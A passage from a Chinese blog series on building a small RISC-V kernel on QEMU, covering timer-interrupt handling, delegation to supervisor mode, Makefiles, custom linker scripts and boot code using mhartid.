寄存器中保存的 PC 值取出，恢复正常程序的执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nasm">3:<br>    ld   a0, 0(sp)<br>    ld   a1, 8(sp)<br>    ld   a2, 16(sp)<br>    ld   a3, 24(sp)<br>    addi sp, sp, 32<br>    mret<br></code></pre></td></tr></table></figure><p>关于 <code>printime</code> 函数，我们使用 C 语言实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> timer = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">printime</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello RISC-V %x\n&quot;</span>, timer++);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在就可以了么？还没有！我们必须在 <code>boot.s</code> 中先行更新一下 <code>mtimecmp</code> 寄存器，不让其为 0 ，否则系统会以为我们完全没有引入时钟中断！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">li   t5, 0x2004000<br>li   t4, 2000000<br>sw   t4, 0(t5)<br></code></pre></td></tr></table></figure><h3 id="Makefile-编译">Makefile 编译</h3><p>整个项目进展到这里，已经有很多文件需要我们去处理了。我们先停下脚步，整理一下我们的文件夹。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">riscv-from-scratch<br>|<span class="hljs-string">--- build# 项目构建后生成的文件</span><br><span class="hljs-string"></span>|<span class="hljs-string">--- kernel# 整个项目的源代码</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- boot.s</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- main.c</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- print.c</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- ns16550a.c</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- ns16550a.h</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- mtrap.s</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">--- my-virt.ld</span><br><span class="hljs-string"></span>|<span class="hljs-string">--- Makefile</span><br></code></pre></td></tr></table></figure><p>现在仍然按照 <a href="https://dingfen.github.io/risc-v/2020/08/01/riscv-from-scratch-4.html"><em>RISC-V from scratch 4</em></a> 中使用的编译命令恐怕就很麻烦了，每次编译光写这么多文件名就足够令人头大，而且每次一点小小的更新都要将所有文件都重新编译链接也不是很划算。因此这里还是推荐使用 Makefile 帮助大家构建工程。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CC=riscv64-unknown-elf-gcc<br>AS=riscv64-unknown-elf-as<br>LD=riscv64-unknown-elf-ld<br>TARGET=build/a.out<br>CFLAG= -c -ffreestanding<br>VIRTLD=-T kernel/my-virt.ld<br><br><span class="hljs-section">all: build/boot.o build/main.o build/mtrap.o  build/ns16550a.o build/print.o</span><br><span class="hljs-variable">$(LD)</span> <span class="hljs-variable">$(VIRTLD)</span> <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$(TARGET)</span><br><br><span class="hljs-section">build/%.o: kernel/%.s</span><br><span class="hljs-variable">$(AS)</span> -g <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$@</span><br><br><span class="hljs-section">build/%.o: kernel/%.c</span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAG)</span> <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$@</span><br><br><span class="hljs-section">qemu: <span class="hljs-variable">$(TARGET)</span></span><br>qemu-system-riscv64 -machine virt -m 128M -nographic \<br> -kernel build/a.out  \<br>    -bios none<br>    <br><span class="hljs-section">clean:</span><br>rm build/*<br></code></pre></td></tr></table></figure><p>编译运行，哇，它成功了！</p><p><img src="/img/run_6.png" alt=""></p><h2 id="监管者模式">监管者模式</h2><p>什么是监管者模式？相比于机器模式的最高权限和强制手段，监管者模式没有这么高的权限。一般来说，监管者模式就是为对标现代操作系统而生的。监管者模式通常存在于复杂的 RISC-V 系统上，其核心功能就是支持内存分页、内存保护、中断/异常处理等，并且为用户模式提供隔离以及 SEE (Supervisor Execution Environment)。</p><p>回顾一下我们的程序，你会发现除了 <code>main.c</code> 函数的部分在监管者模式执行，其他代码几乎都在机器模式下执行。由于机器模式有近乎无限大的权限，让大量代码在该模式下运行是危险的，因此我们应当尽量用中断委托等手段，让更少的代码运行在机器模式下，还有一个重要的原因是，时钟中断处理程序往往与进程调度、切换有关，如果这些操作全在机器模式下完成，是十分不便且危险的。</p><h3 id="痛苦的尝试">痛苦的尝试</h3><p>哈哈哈，接下来就是长时间的查阅资料与令人绝望的编写尝试，我受教颇多。我甚至发现很多实验情况与 RISC-V 官方文档描述的不符，可能是 <code>virt</code> 机器上对 RISC-V 机制的理解和实现不是很到位，也可能是我能力有限，没有领悟到关键。<u>不想看这么多啰嗦和令人作呕的尝试的读者可直接跳过这部分。</u></p><p>这里，我尝试将时钟中断处理放在监管者模式下。在学习完 RISC-V 的中断委托机制后，我首先写出如下代码，将所有的中断/异常处理都委托给监管者模式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">li   t5, 0xffff<br>csrw medeleg, t5<br>csrw mideleg, t5<br></code></pre></td></tr></table></figure><p>如果你使用 GDB 跑一下上面的代码，会发现 <code>medeleg</code> 、<code>mideleg</code> 寄存器的值并不是 <code>0xffff</code> ，这是因为在 <code>virt</code> 机器上，有些中断/异常是不允许被委托给监管者模式的，因此这些位域会被硬接地。实践出真知，经过调试运行后，我发现 <code>medeleg</code> 、<code>mideleg</code> 寄存器分别为 <code>0xbfff</code> 和 <code>0x666</code> 。参考 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html#mcause">mcause 寄存器对应事件表</a>，这意味着，能被委托给监管者模式的中断事件只有 <code>SEIP</code>、<code>STIP</code>、<code>SSIP</code> ；而所有的异常事件都能被委托给监管者模式。这真是令人奇怪，这意味着机器模式、用户模式下的中断处理程序无法被委托给监管者模式了。</p><p>然而实践告诉我，事实上监管者模式下的时钟中断处理也不是直接跳转到监管者模式的😅。它貌似无论如何都会跳转到机器模式下的处理程序，这可能是因为，<strong>对 <code>mtimecmp</code> 寄存器的更改只能在机器模式下完成。</strong></p><p><img src="/img/gdb_value.png" alt=""></p><p>第一种尝试，按照 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a> 如下描述</p><blockquote><p>The <strong>UTIP</strong> and <strong>STIP</strong> bits may be written by M-mode software to <strong>deliver timer interrupts to lower privilege levels</strong>. User and supervisor software may clear the UTIP and STIP bits with calls to the AEE and SEE respectively.</p></blockquote><p>我们只需要在 <code>mtrap.s</code> 中将 <code>mip</code> 寄存器的 <code>STIP</code> 位置为 1 ，就可以将时钟中断传递给监管者模式了。但要注意到，进入监管者模式处理时钟中断后，就无法将 <code>mip</code> 寄存器的 <code>STIP</code> 位清除了（没错就是不行），可能因为这是机器模式才有的权限！意味着你的程序从此永远都在处理时钟中断的路上。为此，你必须在监管者模式处理时钟中断完成后，再跳入到机器模式下将 <code>mip.STIP</code> 位清除（见下左图）。</p><center><img src="/img/try.png" /></center><p>第二种尝试。我试着在机器模式下将 <code>sip.STIP</code> 位置为 1 ，然后监管者模式的时钟中断就可以启动了，再将 <code>sip.STIP</code> 位置为 0 ，但这个尝试不成功，因为 <code>sip.STIP</code> 在机器模式下居然无法被置为 1 （见上中图）。</p><p>第三种尝试。我发现 <code>sip.STIP</code> 位置为 1 不成功，于是直接打算将 <code>sip.SSIP</code> 置为 1 ，即将时钟中断转变成软件中断处理😅，这次，居然成功了（见上右图）。</p><p>事实上还有一条野路子，就是在进入机器模式的时钟中断处理程序后，强行更改 <code>mepc</code> 寄存器和 <code>sepc</code> 寄存器，让程序执行完机器模式的中断后，<code>mret</code> 地跳转到监管者模式下，然后 <code>sret</code> 地回到主程序中😅，这样做只能取得部分成功，中断处理程序在处理第二个时钟中断时会莫名卡一下。</p><p>经过这几天的尝试，我也是被这些奇怪的东西搞的晕头转向，之所以写这么详细，一方面是记录一下自己的实践过程，利于未来解决这一问题，另一方面也是提醒读者和我，要不断思考、尝试、总结，再次说明，读者没有必要细究这部分内容，保护头发，远离玄学。</p><h3 id="最终">最终</h3><p>最终我的实验方式是，在机器模式下的处理程序中将 <code>sip.SSIP</code> 置为 1 ，即将时钟中断转变成软件中断处理😅，然后触发监管者模式的中断处理程序，进而打印出字符串以及清除中断信号。以下是详细介绍：</p><p>首先，因为我们是将时钟中断转变为监管者模式的软件中断，期望用监管者模式下的处理程序处理中断。因此，我们仍然需要用到中断委托机制，将软件中断委托给监管者模式。这里我偷个懒，直接把 <code>0xffff</code> 赋值给 <code>mideleg</code> 和 <code>medeleg</code> 寄存器了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">li   t5, 0xffff<br>csrw medeleg, t5<br>csrw mideleg, t5<br></code></pre></td></tr></table></figure><p>我们的时钟中断会首先触发机器模式下的时钟处理程序，而当且仅当在机器模式下，程序才能更新 <code>mtimecmp</code> 寄存器，因此，M-mode 下的时钟处理程序需要完成：</p><ul><li>读取 <code>mtimecmp</code> 寄存器，累加后在写入</li><li>给出监管者模式的软件中断信号</li></ul><p><u>特别注意：我们的代码中无需时刻比较 <code>mtime</code> 寄存器和 <code>mtimecmp</code> 寄存器的大小，我推测这是硬件帮我们做的事。</u>我们只需要关心 <code>mtimecmp</code> 寄存器的值就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nasm">1:<br>    # handle timer interrupt add mtimecmp<br>    la   a1, 0x2004000<br>    ld   a2, 0(a1)<br>    li   a3, 2000000<br>    add  a2, a2, a3<br>    sd   a2, 0(a1)<br>    # delegate to S-mode Software Interrupt<br>li   a1, 1 &lt;&lt; 1<br>    csrw sip, a1<br></code></pre></td></tr></table></figure><p>由于在这里我们将 <code>sip.SSIP</code> 位置为 1 ，因此会马上触发监管者模式下的中断程序。我将监管者模式的中断处理程序放在文件 <code>strap.s</code> 中，那么这中断处理程序该怎么写呢？其实还是老样子：</p><ul><li>保存现场</li><li>完成中断服务</li><li>恢复现场</li><li>返回主函数</li></ul><p>保存、恢复现场的部分就略过了，重点说一下中断服务，首先需要判断是什么中断/异常类型，再调用 <code>printime</code> 函数，最后清除软件中断信号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nasm">strap_vector:<br># save registers<br># get cause of interrupt<br>    csrr a1, scause<br>    andi a1, a1, 0x3f<br>    li   a2, 1<br>    bne  a1, a2, 1f<br>    call printime<br>    li   a1, 0<br>    csrw sip, a1<br>    # load registers<br>    # sret<br></code></pre></td></tr></table></figure><p>最后，大家修改一下 Makefile ，再进行编译运行，就会发现字符串非常有规律地被打印出来了！而且，打印函数还是运行在监管者模式下的。这为我们接下来的进程调度工作做了很好地铺垫。</p><h2 id="接下来">接下来</h2><p>呼，本博文一下子介绍了 <code>printf</code> 函数的实现和时钟中断处理。有没有感觉头晕脑涨了呢，千万不要灰心丧气，这也是我好几天的工作成果，遇到过不去的地方是很正常的。遗憾的是，我最终也没有弄明白如何”正确“地处理时钟中断委托，恳请网上的各位大佬们指点迷津啊🤷。</p><p>和前文讲的一样，接下来，我们开始准备攻克下一个难题——进程。首先需要明白进程的含义，并定义一个进程的结构体，最后，我们期望得到一个可多进程运行的小内核。除此之外，我们可能也需要弄明白如何把从键盘的输入字符打印在屏幕上。</p>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 5</title>
    <link href="/2020/08/06/2020-8-6-riscv-from-scratch-5/"/>
    <url>/2020/08/06/2020-8-6-riscv-from-scratch-5/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from scratch 5</h1><p>接上一篇<a href="https://dingfen.github.io/risc-v/2020/08/01/riscv-from-scratch-4.html">博客</a>，我今天继续写 <em>RISC-V from scratch</em> 系列博客。原本我打算将该<a href="https://github.com/twilco/riscv-from-scratch">英文系列</a>全部翻译成中文，但原作者貌似没有把这一系列完成就咕咕了，<strong>因此本文的内容是我自己实践的内容，以及一些自己的想法，放在这里同大家探讨，算是狗尾续貂，弥补遗憾</strong>。</p><h2 id="简介">简介</h2><p>欢迎再次来到 <em>RISC-V from scratch</em> ，先快速回顾一下我们之前做过的内容，我们之前已经探索了很多与 RISC-V 及其生态相关的底层概念（例如编译、链接、原语运行时、汇编等）。具体来说，在上一篇文章中，我们完成了一个简陋的 <strong>UART</strong> 驱动程序，并利用该驱动程序完成了打印字符的任务，今天，我们紧接着上一篇的实验内容，继续深入探讨 RISC-V，完善咱们的小内核。</p><p>本篇博客中，我们将会：</p><ul><li>写一个自己的链接器脚本</li><li>使用 RISC-V 提供的机器模式特权寄存器</li><li>初始化 bss 数据段</li></ul><h2 id="搭建环境"><a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">搭建环境</a></h2><p>如果你还未看本系列博客的第一部分，没有安装 <code>riscv-qemu</code> 和 RISC-V 工具链，那么赶紧点击上面标题的链接，跳转到 <a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">“QEMU and RISC-V toolchain setup”</a> 。</p><h2 id="往期回顾">往期回顾</h2><p>在 <em>RISC-V from scratch 4</em> 中，我们实现了一个简单的 UART 驱动程序和一个简单的 C 运行时 <code>crt0.s</code>，并达到了预期效果，见下图：</p><p><img src="/img/uarthi.png" alt=""></p><p>考虑到 <code>crt0.s</code> 的实现已经是第二章的事情了，比较久远，因此在这里贴出代码，也是为了方便下一步的讨论。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nasm">.section .init, &quot;ax&quot;<br>.global _start<br>_start:<br>    .cfi_startproc<br>    .cfi_undefined ra<br>    .option push<br>    .option norelax<br>    la gp, __global_pointer$<br>    .option pop<br>    la sp, __stack_top<br>    add s0, sp, zero<br>    jal zero, main<br>    .cfi_endproc<br>    .end<br></code></pre></td></tr></table></figure><p>然而，我们为了打出字符串 “hi” ，将主程序写成了这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> p = <span class="hljs-string">&#x27;h&#x27;</span>;<br>    uartinit();<br>    uartputc(p);<br>    p++;<br>    uartputc(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>难道不能把它放入一个字符串，循环打印出来么？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> p[] = <span class="hljs-string">&quot;hello&quot;</span>;<br>    uartinit();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>        uartputc(p[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>你会发现，这样的尝试失败了，你会得到一个很奇怪的链接错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">relocation truncated to fit: R_RISCV_HI20 against `p&#x27;<br></code></pre></td></tr></table></figure><p>这是为什么呢？在本系列的第二篇<a href="https://dingfen.github.io/risc-v/2020/07/26/riscv-from-scratch-2.html#%E9%93%BE%E6%8E%A5%E8%B5%B7%E6%9D%A5">博客中</a>，我们使用如下方法得到了一个链接器脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">In the `riscv-from-scratch/work` directory...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Copy the default linker script into riscv64-virt.ld</span><br>riscv64-unknown-elf-ld --verbose &gt; riscv64-virt.ld<br></code></pre></td></tr></table></figure><p>该脚本中的内容非常复杂，说实话，大部分内容我至今都没有看懂，但这并不妨碍我们以后的实验，我们只需要知道，这个舶来品现在水土不服了。</p><h2 id="再回链接器脚本">再回链接器脚本</h2><p>什么是链接器脚本，具体来说，链接器控制了各个程序中 section 的合并以及摆放位置，在一般情况下，我们写程序时完全不需要关心程序放在内存的哪个位置，因为我们平时写的代码都是 PIC (Position-Independent Code)，它们可以运行在内存中的任意位置。但现在，我们要完成一个 RISC-V 内核，程序摆放的位置就值得考究了，要是你随意摆放的话，那机器怎么知道你要把代码放在哪里，从哪里开始运行呢？</p><p>为了编写一个自定义的链接器脚本，我们必然要先学它的基本语法。这里我推荐一个博主的教程 <a href="http://bravegnu.org/gnu-eprog/lds.html">Linker Script File</a>，里面介绍了非常基础的语法知识，非常适合初学者。在这里我就不详细解释链接器脚本的语法了。</p><p>学好链接器脚本的语法后，就可以动手写了！</p><p>首先，创建文件 <code>my-virt.ld</code> ，加入入口 <code>_start</code> 以及第二章中我们已经加的 MEMORY 指令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">ENTRY(_start)<br>MEMORY<br>&#123;<br>   /* qemu-system-riscv64 virt machine */<br>   RAM (rwx) : ORIGIN = 0x80000000, LENGTH = 128M<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就是 SECTION 语句：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">SECTION</span> <br>&#123;<br>    PROVIDE(__stack_top = <span class="hljs-number">0x88000000</span>)<span class="hljs-comment">;</span><br>    PROVIDE(__uart_base_addr = <span class="hljs-number">0x10000000</span>)<span class="hljs-comment">;</span><br>    <br>    . = <span class="hljs-number">0x80000000</span><span class="hljs-comment">;</span><br>    <span class="hljs-meta">.text</span> : &#123;<br>    * (<span class="hljs-meta">.text</span>)<span class="hljs-comment">;</span><br>    &#125;<br>    <br>    <span class="hljs-meta">.data</span> : &#123;<br>        __global_pointer$ = .<span class="hljs-comment">;</span><br>    * (<span class="hljs-meta">.data</span>)<span class="hljs-comment">;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将代码 text 放到了内存起始点，数据段紧跟其后。那么问题来了，<code>__global_pointer$</code> 这个值，该指向哪里呢？指向数据段的中部？尾部？顶部？常量静态数据在前在后？全局数据与局部静态数据又如何？那么大家问问自己的直觉，<code>__global_pointer$</code> 最有可能在哪里？顶部？没错，博主本人在做实验时就放在了顶部，还就真的对了（当然博主讲话是负责任的，证据在后面）。</p><p>那么现在问题解决了么？还没有！因为我们还没有确定 <code>.init</code> section 的位置，往前翻翻，注意到 <code>crt0.s</code> 里面的代码，可是放在 <code>.init</code> section 里面的（没错，就是因为这个，我才把它贴在这里）。在本系列的第二篇<a href="https://dingfen.github.io/risc-v/2020/07/26/riscv-from-scratch-2.html">博客中</a>，我们已经详细说明了 C Runtime 的重要性，不把它放在 <code>0x80000000</code> ，程序一定跑不了。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">SECTION <br>&#123;<br>    PROVIDE<span class="hljs-params">(<span class="hljs-attr">__stack_top</span> = 0x88000000)</span>;<br>    PROVIDE<span class="hljs-params">(<span class="hljs-attr">__uart_base_addr</span> = 0x10000000)</span>;<br>    <br>    . = 0x80000000;<br>    <span class="hljs-string">.init</span> : &#123;<br>    * <span class="hljs-params">(.init)</span>;<br>    &#125;<br>    <span class="hljs-string">.text</span> : &#123;<br>    * <span class="hljs-params">(.text)</span>;<br>    &#125;<br>    <br>    <span class="hljs-string">.data</span> : &#123;<br>        __global_pointer$ = .;<br>    * <span class="hljs-params">(.data)</span>;<br>    &#125;<br>    <span class="hljs-string">.rodata</span> : &#123;<br>    * <span class="hljs-params">(.rodata)</span>;<br>    &#125;<br>    <br>    __bss_start = .;<br>    <span class="hljs-string">.bss</span> : &#123;<br>    * <span class="hljs-params">(.bss)</span>;<br>    &#125;<br>    __bss_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><p>为了节省篇幅，把后面的东西都加了进来，事实上也没啥，就是 <code>.rodata</code> 和 <code>.bss</code> 段，分别存放只读数据（常量数据）和未初始化数据，如果不太清楚这些段名的作用，可以参考 <a href="https://blog.csdn.net/jxm_csdn/article/details/39829535">C 语言内存分布</a>。</p><p>那么到此为止，能不能实现我们预期的结果呢？按一下方式编译运行程序，若不出意外，就可以看到字符串 “hello” 了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">riscv64-unknown-elf-gcc -c kernel/main.c -o build/main.o</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">riscv64-unknown-elf-gcc -c kernel/ns16550a.c -o build/ns16550a.o</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">riscv64-unknown-elf-as kernel/crt0.s -o build/crt0.o</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">riscv64-unknown-elf-ld build/crt0.o build/main.o build/ns16550a.o -T kernel/my-virt.ld</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">qemu-system-riscv64 -machine virt -m 128M -kernel a.out -bios none -nographic</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CC=riscv64-unknown-elf-gcc<br>AS=riscv64-unknown-elf-as<br>LD=riscv64-unknown-elf-ld<br><br>TARGET=build/a.out<br>CFLAG= -c<br>VIRTLD=-T [your-src-directory]/my-virt.ld<br><br><span class="hljs-section">all: build/crt0.o build/main.o build/ns16550a.o</span><br><span class="hljs-variable">$(LD)</span> <span class="hljs-variable">$(VIRTLD)</span> <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$(TARGET)</span><br><br><span class="hljs-section">build/%.o: [your-src-directory]/%.s</span><br><span class="hljs-variable">$(AS)</span> -g <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$@</span><br><br><span class="hljs-section">build/%.o: [your-src-directory]/%.c</span><br><span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAG)</span> <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$@</span><br></code></pre></td></tr></table></figure><p>如果大家看过<a href="https://dingfen.github.io/risc-v/2020/08/01/riscv-from-scratch-4.html">第四章博客</a>，一定对 <code>Makefile</code> 的简洁方便印象深刻，所以我也提供了 <code>Makefile</code> 的编写，也会发现我们这次编译程序的方式不太相同（两次编译都能过）。如果你不喜欢这种方式，可以尝试一下这个 <code>riscv64-unknown-elf-gcc -g -ffreestanding -O0 -Wl,--gc-sections -nostartfiles -nostdlib -nodefaultlibs -Wl,-T,my-virt.ld crt0.s ns16550a.c main.c</code> 冗长繁杂的命令😅。</p><h2 id="机器模式">机器模式</h2><p>我们要想实现一个可以工作的内核，<code>crt0.s</code> 中那几行简短的代码肯定是不够的，因为 <code>crt0.s</code> 中只是建立的栈，找到了数据段位置，然后就跳转到 <code>main</code> 函数了。然而一个可以工作的内核需要处理中断控制、中断处理、状态指示、权限设置甚至多 CPU 处理等多方面问题。考虑到 <code>crt0.s</code> 是机器启动后，最先开始执行的代码，一定处在机器模式——权限最高的模式，那我们必然要给它塞一些更加繁重的任务。</p><p>可能有些读者对 RISC-V 的特权架构不是很熟，建议看一下 <a href="https://dingfen.github.io/risc-v/2020/08/05/riscv-privileged.html">RISC-V 特权架构</a> 和 <a href="http://crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf">RISC-V 中文手册</a> 和 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged manual</a> 。由于篇幅关系，我就不在这里展开介绍了。</p><p>首先，我们要给 <code>crt0.s</code> 文件正式升级，将它改名为 <code>boot.s</code> ，或者随便什么你喜欢的名字（<code>start.s</code> 、<code>entry.s</code> 、<code>head.S</code> 之类的）。</p><h3 id="mhartid-寄存器">mhartid 寄存器</h3><p>考虑到 <code>QEMU</code> <code>virt</code> 机器可以使用多个处理器，那么我们就需要防止多个 hart 执行 <code>boot.s</code> ，在机器刚开始运行（以及我们刚开始编写代码时），一哄而上可不是什么好的选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nasm">_start:<br>    # read our hart identifier into t0<br>    # see if it is 0, if not to busy loop<br>    csrr t0, mhartid<br>    bnez t0, 4f<br>    ...<br>4:<br>    wfi<br>    j 4b<br></code></pre></td></tr></table></figure><p>因此这里我们首先使用 mhartid 寄存器获取 hart 的 ID ，<code>csrr</code> 是一个伪指令，它读取一个 CSR 寄存器。让非 0 的 hart 全部跳转到死循环里，并将它们 stall 住，死循环中 <code>wfi</code> 指令在这方面是专家：</p><blockquote><p>The Wait for Interrupt instruction (WFI) provides a hint to the implementation that the current hart can be stalled until an interrupt might need servicing.</p></blockquote><h3 id="satp-寄存器">satp 